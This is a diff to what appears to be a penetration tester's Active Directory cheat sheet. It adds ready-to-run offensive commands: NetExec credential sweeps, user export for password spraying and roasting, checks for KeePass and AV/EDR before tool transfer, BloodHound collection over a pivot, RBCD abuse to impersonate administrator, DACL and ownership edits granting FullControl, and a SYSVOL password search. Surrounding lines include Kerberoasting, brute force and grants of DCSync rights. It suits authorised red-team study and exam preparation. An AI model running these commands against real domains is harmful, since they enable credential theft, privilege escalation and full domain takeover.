@@ -59,6 +59,7 @@
 ^AD notes:If new network segments discovered on compromised host → check ipconfig /all.
 ^AD notes:If internal pivot required → run tunneling tools such as ssh -D, chisel, or proxychains.
 ^AD notes:After pivoting into a new network segment, restart enumeration → return to Domain Info.
+^AD notes:BloodHound CE collection should use bloodhound-ce-python where possible; use NetExec BloodHound collection only as fallback.
 ^AD Reminder:Start by confirming AD context (domain/DC/trusts) → run Domain Info.
 ^AD Reminder:If SMB/RPC allow anonymous probing, enumerate users quickly → run SMB Null Session then RID Brute.
 ^AD Reminder:Once you have usernames, expand candidate lists → run Username Anarchy then Kerbrute.
@@ -139,14 +140,29 @@
 ^AD Reminder:AddKey (Shadow Credentials) → inject key credential and authenticate via PKINIT → run: certipy-ad shadow auto -u <user> -p '<password>' -account <target_account> -dc-ip <dc-ip>
 ^AD Reminder:If you obtain any domain user shell → run SharpHound collection early to identify privilege escalation paths in BloodHound.
 ^AD Reminder:If SharpHound output exists on disk → download the ZIP/JSON files and import into BloodHound GUI for attack path analysis.
+^AD Reminder:If BloodHound shows AddMember or WriteDACL over a group that looks useless, add your owned user anyway, refresh the token, re-test SMB/WinRM/RDP/MSSQL, and re-collect BloodHound.
+^AD Reminder:If new group membership does not appear in whoami /groups, start a fresh WinRM/RDP/session because existing Windows tokens can be stale.
+^AD Reminder:If BloodHound upload succeeds but graph looks empty, verify the ZIP contains JSON, the collector is bloodhound-ce-python, DNS points to the DC, and the Ligolo route is working.
+^AD Reminder:If Kerberos authentication fails unexpectedly, check time skew and sync Kali time with the DC before troubleshooting credentials.
+^AD Reminder:If Kerberos tools fail with clock-skew errors → run: Kerberos NTPDate
 ^AD attack notes:See https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol for available nxc protocols
 
+^NXC Sweep:nxc-sweep <target> -u <user> -p '<password>' [--local-auth] #sweep subnet/host list with NetExec to test credentials across SMB and identify accessible hosts (use --local-auth for local accounts); kali-machine
 Domain Info:nxc smb <target> # Probe SMB to fingerprint domain/workgroup and host OS; kali-machine
+Domain Info:nxc smb <target> -u '<user>' -p '<password>' --interfaces #enumerate remote network interfaces to identify additional pivot networks; kali-machine
+Domain Info:nxc smb <target> -u '<user>' -p '<password>' --users-export <filename1> #export enumerated SMB/domain users to file for reuse in spraying or roasting workflows; kali-machine
+Domain Info:nxc smb <target> -u '<user>' -p '<password>' --tasklist keepass.exe #check remotely for KeePass process when hunting credential databases or active password vault use; kali-machine
+Domain Info:nxc smb <target> -u '<user>' -p '<password>' -M enum_av #enumerate AV/EDR products on remote Windows host before transferring tools; kali-machine
+Domain Info:nxc smb <target> -u '<user>' -p '<password>' -M ntlmv1 #check whether target allows weak NTLMv1 authentication for risk triage; kali-machine
 Domain Info:nltest /dclist:<domain> # List domain controllers from Windows; target-machine
 Domain Info:nltest /domain_trusts # List domain trusts; target-machine
 Domain Info:nltest /dsgetdc:<domain> # Get domain controller info; target-machine
 Domain Info:nltest /forest_trusts # List forest trusts; target-machine
 Domain Info:echo %USERDOMAIN% # Show current domain from environment; target-machine
+Domain Info:([ADSI]'LDAP://RootDSE') | Select-Object defaultNamingContext,dnsHostName,domainFunctionality,forestFunctionality #query LDAP RootDSE with built-in PowerShell/.NET to confirm domain naming context and DC details; target-machine
+Domain Info:$root=([ADSI]'LDAP://RootDSE').defaultNamingContext; $s=New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$root"); $s.Filter='(&(objectCategory=person)(objectClass=user))'; $s.PageSize=1000; $s.FindAll() | ForEach-Object {$_.Properties.samaccountname} #enumerate domain users using built-in ADSI without RSAT or PowerView; target-machine
+Domain Info:$root=([ADSI]'LDAP://RootDSE').defaultNamingContext; $s=New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$root"); $s.Filter='(objectCategory=group)'; $s.PageSize=1000; $s.FindAll() | ForEach-Object {$_.Properties.samaccountname} #enumerate domain groups using built-in ADSI without RSAT or PowerView; target-machine
+Kerberos NTPDate:sudo ntpdate -u <dc-ip> #sync Kali time with Domain Controller to prevent Kerberos authentication failures caused by clock skew; kali-machine
 SMB Null Session:smbclient -L //<target> -N # List shares with null session; kali-machine
 SMB Null Session:rpcclient -U "" -N <target> # Connect to RPC with null session; kali-machine
 SMB Null Session:enum4linux -a -u "" -p "" <target> # Enumerate with null session; kali-machine
@@ -168,6 +184,8 @@ LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --password-not-
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --admin-count # Find admin accounts; kali-machine
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --asreproast asrep.out # AS-REP roast with creds; kali-machine
 LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --kerberoasting output.txt # Kerberoast with creds; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' -M get-desc-users #search AD user descriptions for exposed passwords or operational notes; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' -M ldap-checker #check LDAP signing and channel binding posture for relay-risk assessment; kali-machine
 Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> # Enumerate users via Kerberos; kali-machine
 Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> | grep -i '@<domain>' | awk '{print $2}' | cut -d '@' -f1 > users.txt # Extract clean usernames; kali-machine
 Kerbrute:/home/kali/Tools/windows/kerbrute_linux_amd64 bruteuser -d <domain> --dc <dc-ip> <wordlist1> <user> # Brute force single user; kali-machine
@@ -185,6 +203,12 @@ BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session # Collect specific data; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All --zip # Collect and zip; kali-machine
 BloodHound Python:bloodhound-python -d <domain> -u <user> --hashes <ntlm> -dc <dc-ip> -c All # Collect with NTLM hash; kali-machine
+BloodHound Python:bloodhound-ce-python -u <user> -p '<password>' -d <domain> -ns <dc-ip> -c All --dns-tcp --zip #collect full BloodHound CE dataset through pivot using DC DNS over TCP; kali-machine
+BloodHound Python:bloodhound-ce-python -u <user> --hashes :<ntlm> -d <domain> -ns <dc-ip> -c All --dns-tcp --zip #collect BloodHound CE data using NTLM hash authentication; kali-machine
+BloodHound Python:bloodhound-ce-python -u <user> -p '<password>' -d <domain> -ns <dc-ip> -c DCOnly --dns-tcp --zip #collect minimal DC-only BloodHound CE data when full collection is unstable; kali-machine
+BloodHound Python:bloodhound-ce-python -u <user> -p '<password>' -d <domain> -ns <dc-ip> -c Group,LocalAdmin,Session,Trusts --dns-tcp --zip #split BloodHound CE collection to reduce instability during pivoted enumeration; kali-machine
+BloodHound Python:bloodhound-ce-python -u <user> -p '<password>' -d <domain> -ns <dc-ip> -c ACL,ObjectProps --dns-tcp --zip #collect ACL and object property data when BloodHound paths appear incomplete; kali-machine
+BloodHound NXC:nxc ldap <dc-ip> -u '<user>' -p '<password>' --bloodhound --collection All --dns-server <dc-ip> --dns-tcp #fallback BloodHound collection with NetExec when bloodhound-ce-python fails; kali-machine
 BloodHound NXC:nxc ldap <target> -u '<user>' -p '<password>' --bloodhound --collection All --dns-server <dc-ip> # Collect via nxc; kali-machine
 SharpHound:.\SharpHound.exe -c All # Run SharpHound on target; target-machine
 SharpHound:.\SharpHound.exe --CollectionMethods All --Domain <domain> --DNSHost <dc-ip> # Run with specific DC; target-machine
@@ -290,10 +314,16 @@ Unconstrained Delegation:.\Rubeus.exe harvest /interval:30 # Harvest tickets on 
 RBCD:impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Password123!' -dc-ip <dc-ip> <domain>/<user>:'<password>' # Add computer account; kali-machine
 RBCD:.\Rubeus.exe rbcd /tgt:<target_computer>$ /tgs:<attacker_computer>$ /nowrap # Set RBCD on target; target-machine
 RBCD:.\Rubeus.exe s4u /user:<attacker_computer>$ /rc4:<ntlm> /impersonateuser:administrator /msdsspn:cifs/<target>.<domain> /ptt # Impersonate admin; target-machine
+RBCD:impacket-rbcd '<domain>/<user>:<password>' -dc-ip <dc-ip> -delegate-to '<computer>$' -delegate-from '<computer>$' -action write #configure Resource-Based Constrained Delegation from controlled computer to target computer; kali-machine
+RBCD:impacket-getST '<domain>/<computer>$:<password>' -dc-ip <dc-ip> -spn cifs/<target>.<domain> -impersonate administrator #request S4U service ticket to impersonate administrator after RBCD write; kali-machine
 ACL Abuse:Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <user> -Rights ResetPassword -Verbose # Grant password reset rights; target-machine
 ACL Abuse:Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd@123' -AsPlainText -Force) # Reset password with rights; target-machine
 ACL Abuse:Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> # Add to group with write permissions; target-machine
 ACL Abuse:Add-ObjectACL -TargetDistinguishedName "DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync # Grant DCSync rights; target-machine
+ACL Abuse:impacket-dacledit '<domain>/<user>:<password>' -dc-ip <dc-ip> -target '<user>' -action write -rights FullControl #grant FullControl over target AD user when WriteDACL is available; kali-machine
+ACL Abuse:impacket-dacledit '<domain>/<user>@<dc-ip>' -hashes :<ntlm> -dc-ip <dc-ip> -target '<user>' -action write -rights FullControl #grant FullControl over target AD object using NTLM hash authentication; kali-machine
+ACL Abuse:impacket-owneredit '<domain>/<user>:<password>' -dc-ip <dc-ip> -target '<user>' -action write -new-owner <user> #take ownership of target AD object before modifying its ACL; kali-machine
+GPP/cPassword:findstr /spin /i "password cpassword" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\Policies\* 2>nul #search SYSVOL policies for passwords and legacy GPP cpassword artifacts from Windows shell; target-machine
 GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_password # Find GPP passwords; kali-machine
 GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_autologin # Find autologon creds; kali-machine
 GPP/cPassword:gpp-decrypt <cpassword> # Decrypt GPP password; kali-machine
